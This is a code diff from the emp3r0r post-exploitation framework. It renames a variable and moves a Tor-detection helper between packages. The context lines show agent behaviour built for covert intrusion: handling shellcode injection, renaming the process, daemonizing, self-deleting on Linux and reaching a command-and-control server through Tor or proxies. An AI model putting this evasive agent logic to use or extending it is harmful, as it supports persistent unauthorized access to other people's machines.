@@ -22,6 +22,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/proxychain"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
@@ -33,7 +34,7 @@ func agent_main() {
 
 	// check if this process is invoked by guardian shellcode
 	// by checking if process executable is same as parent's
-	is_injected := util.ProcExePath(os.Getpid()) ==
+	isForked := util.ProcExePath(os.Getpid()) ==
 		util.ProcExePath(os.Getppid())
 
 	// accept env vars
@@ -69,13 +70,13 @@ func agent_main() {
 		persistence = true
 	}
 
-	do_not_touch_argv := is_dll || is_injected
+	do_not_touch_argv := is_dll || isForked
 	renameProcessIfNeeded(persistence, do_not_touch_argv)
 	exe_path := util.ProcExePath(os.Getpid())
 	daemonizeIfNeeded(verbose, is_dll, exe_path)
 
 	// self delete
-	self_delete := !is_dll && !is_injected && !persistence && runtime.GOOS == "linux"
+	self_delete := !is_dll && !isForked && !persistence && runtime.GOOS == "linux"
 	if self_delete {
 		err = deleteCurrentExecutable()
 		if err != nil {
@@ -90,7 +91,7 @@ func agent_main() {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
 
-	if is_injected {
+	if isForked {
 		// restore original executable file
 		err = util.Copy(
 			fmt.Sprintf("%s/%s",
@@ -126,7 +127,7 @@ func agent_main() {
 		// remove *.downloading files
 		cleanUpDownloadingFiles()
 
-		if is_injected || is_dll {
+		if isForked || is_dll {
 			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
 				os.Getpid(), os.Getppid())
 		}
@@ -171,7 +172,7 @@ test_agent:
 
 	// Construct CC address
 	// if CC is behind tor, a proxy is needed
-	if transport.IsTor(def.CCAddress) {
+	if netutil.IsTor(def.CCAddress) {
 		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
 		// by default we use 443, so configure your torrc accordingly
 		def.CCAddress = fmt.Sprintf("%s/", def.CCAddress)
@@ -240,7 +241,7 @@ test_agent:
 			}
 			return true
 
-		} else if !transport.IsTor(def.CCAddress) &&
+		} else if !netutil.IsTor(def.CCAddress) &&
 			!transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
